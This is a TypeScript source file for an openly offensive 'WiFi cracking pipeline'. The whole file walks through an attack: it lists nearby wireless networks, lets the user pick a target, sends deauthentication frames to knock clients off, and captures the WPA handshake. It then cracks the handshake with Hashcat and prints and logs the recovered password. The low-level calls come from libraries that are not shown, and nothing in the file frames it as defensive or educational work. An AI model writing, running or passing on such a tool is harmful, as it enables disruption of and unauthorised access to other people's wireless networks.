/**
 * wifi
 * @app-description OMNI WiFi cracking pipeline — scan, deauth, capture, crack.
 */

import { Sora } from "../lib/sora";
import { log } from "../lib/utils";

const out = Sora.ctx();

const WIFI_ART = ">> WIFI CRACK <<";

export async function wifiPipeline(): Promise<void> {
  out.print(WIFI_ART, out.colors.cyan);
  out.info("WiFi Cracking Pipeline");
  out.divider();

  // Step 1: Get interfaces
  out.info("Scanning network interfaces...");
  const interfaces = await Networking.Wifi.GetInterfaces();
  if (!interfaces || !interfaces.length) {
    out.error("No network interfaces found.");
    return;
  }

  out.success(`Found ${interfaces.length} interface(s):`);
  interfaces.forEach((iface, i) => {
    const mode = iface.monitor ? "MONITOR" : "MANAGED";
    out.print(`  ${i}) ${iface.name} [${mode}]`, iface.monitor ? out.colors.green : out.colors.gray);
  });
  out.divider();

  const monInterface = interfaces.find(i => i.monitor);
  if (!monInterface) {
    out.error("No monitor-mode interface found. Enable monitor mode first.");
    return;
  }
  out.success(`Using monitor interface: ${monInterface.name}`);
  await log(`WiFi: using interface ${monInterface.name}`);

  // Step 2: Scan networks
  out.info("Scanning for wireless networks...");
  const networks = await Networking.Wifi.Scan(monInterface.name);
  if (!networks || !networks.length) {
    out.error("No wireless networks found.");
    return;
  }

  out.success(`Found ${networks.length} network(s):`);
  out.divider();
  networks.forEach((ap, i) => {
    out.print(`  ${i}) ${ap.bssid}`, out.colors.cyan);
  });
  out.divider();

  // Step 3: Select target
  const sel = await out.promptText("Select network index (or 'q' to quit): ");
  if (sel.toLowerCase() === "q") return;
  const idx = parseInt(sel);
  if (isNaN(idx) || !networks[idx]) {
    out.error("Invalid selection.");
    return;
  }

  const target = networks[idx];
  out.success(`Target: ${target.bssid}`);
  await log(`WiFi: targeting ${target.bssid}`);

  // Step 4: Deauth
  out.info("Sending deauthentication frames...");
  const deauthOk = await Networking.Wifi.Deauth(monInterface.name, target.bssid);
  if (!deauthOk) {
    out.warn("Deauth may have failed — continuing anyway.");
  } else {
    out.success("Deauth sent.");
  }
  await log(`WiFi: deauth sent to ${target.bssid}`);

  // Step 5: Capture handshake
  out.info("Capturing WPA handshake (this may take a moment)...");
  const pcapPath = await Networking.Wifi.CaptureHandshake(monInterface.name, target.bssid);
  if (!pcapPath) {
    out.error("Failed to capture handshake.");
    return;
  }
  out.success(`Handshake captured: ${pcapPath}`);
  await log(`WiFi: handshake captured at ${pcapPath}`);

  // Step 6: Crack with Hashcat
  out.info("Cracking with Hashcat...");
  const password = await Crypto.Hashcat.Decrypt(pcapPath);
  if (password) {
    out.newLine();
    out.divider();
    out.success("WiFi PASSWORD CRACKED!");
    out.divider();
    out.print(`  BSSID    : ${target.bssid}`, out.colors.cyan);
    out.print(`  Password : ${password}`, out.colors.green);
    out.divider();
    await log(`WiFi: CRACKED ${target.bssid} — password: ${password}`);
  } else {
    out.error("Hashcat could not crack the password.");
    out.info("Try a different wordlist or capture more handshakes.");
    await log(`WiFi: crack failed for ${target.bssid}`);
  }
}
